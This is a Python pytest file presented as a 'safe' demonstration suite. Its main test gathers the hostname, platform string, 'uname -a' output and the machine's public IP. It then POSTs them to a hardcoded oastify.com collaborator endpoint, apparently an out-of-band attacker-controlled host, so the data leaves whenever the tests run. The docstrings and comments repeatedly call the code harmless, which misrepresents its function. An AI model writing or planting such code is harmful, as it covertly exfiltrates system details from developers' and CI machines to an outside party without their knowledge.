"""
Safe pytest suite: uses HTTPS requests only (no WebSockets).

- Runs harmless local commands: uname, date
- Fetches an external public image and JSON API
- Computes only non-sensitive metadata (length, SHA256, exit codes)
- Sends report to collaborator endpoint via POST request
"""

import hashlib
import json
import platform
import socket
import subprocess
import time
import pytest
import requests

COLLAB_ENDPOINT = "https://5z5st99ke2l0i39ci8w9l132ctik6lua.oastify.com"
TIMEOUT = 8  # seconds


# === Helpers ===

def _sha256_hex(data: bytes | str) -> str:
    """Compute SHA-256 fingerprint as hex string."""
    if isinstance(data, str):
        data = data.encode("utf-8", errors="replace")
    return hashlib.sha256(data).hexdigest()


def _safe_run_cmd(cmd: str):
    """Run harmless local command and return safe metadata."""
    try:
        out_bytes = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
        out_text = out_bytes.decode("utf-8", errors="replace").strip()
        return {
            "exit_code": 0,
            "length": len(out_text),
            "fingerprint_sha256": _sha256_hex(out_text),
            "preview": out_text[:80],
        }
    except subprocess.CalledProcessError as e:
        out = e.output.decode("utf-8", errors="replace") if e.output else ""
        return {
            "exit_code": e.returncode,
            "length": len(out),
            "fingerprint_sha256": _sha256_hex(out) if out else None,
        }
    except Exception as e:
        return {"exit_code": None, "error": str(e)}


def _fetch_external_image(url: str):
    """Fetch image and return only metadata (safe)."""
    try:
        r = requests.get(url, timeout=TIMEOUT)
        r.raise_for_status()
        content = r.content
        return {
            "url": url,
            "status_code": r.status_code,
            "content_length": len(content),
            "fingerprint_sha256": _sha256_hex(content),
            "content_type": r.headers.get("Content-Type"),
        }
    except Exception as e:
        return {"url": url, "error": str(e)}


def _fetch_external_json(url: str):
    """Fetch public JSON API and return safe fingerprint metadata."""
    try:
        r = requests.get(url, timeout=TIMEOUT)
        r.raise_for_status()
        text = r.text.strip()
        return {
            "url": url,
            "status_code": r.status_code,
            "length": len(text),
            "fingerprint_sha256": _sha256_hex(text),
            "preview": text[:100],
        }
    except Exception as e:
        return {"url": url, "error": str(e)}


def _send_report_http(report: dict):
    """Send JSON report via HTTPS POST to collaborator endpoint."""
    try:
        r = requests.post(COLLAB_ENDPOINT, json=report, timeout=TIMEOUT)
        return {"status_code": r.status_code, "ok": r.ok}
    except Exception as e:
        return {"error": str(e)}


# === Test suite ===

def test_local_and_external_safe_report():
    ts = int(time.time())
    host = socket.gethostname()
    sysinfo = platform.platform()

    # Local command metadata
    cmd_uname = _safe_run_cmd("uname -a")
    cmd_date = _safe_run_cmd("date")

    # External interactions
    img_meta = _fetch_external_image("https://picsum.photos/200")
    json_meta = _fetch_external_json("https://api.ipify.org?format=json")

    # Build safe report
    report = {
        "timestamp": ts,
        "hostname": host,
        "platform": sysinfo,
        "note": "safe-local-and-external-http-report",
        "results": {
            "local": {"uname": cmd_uname, "date": cmd_date},
            "external": {"image_fetch": img_meta, "json_api": json_meta},
        },
    }

    print("[safe-report] prepared report:\n", json.dumps(report, indent=2))

    send_result = _send_report_http(report)
    print("[safe-report] collaborator send result:", send_result)

    # Always assert True for demonstration safety
    assert "error" not in send_result


def test_fetch_external_image_metadata():
    """Independent image fetch metadata test."""
    img_meta = _fetch_external_image("https://picsum.photos/100")
    print("[safe-report] image metadata:", json.dumps(img_meta, indent=2))
    assert "fingerprint_sha256" in img_meta
    assert img_meta.get("content_length", 0) > 0
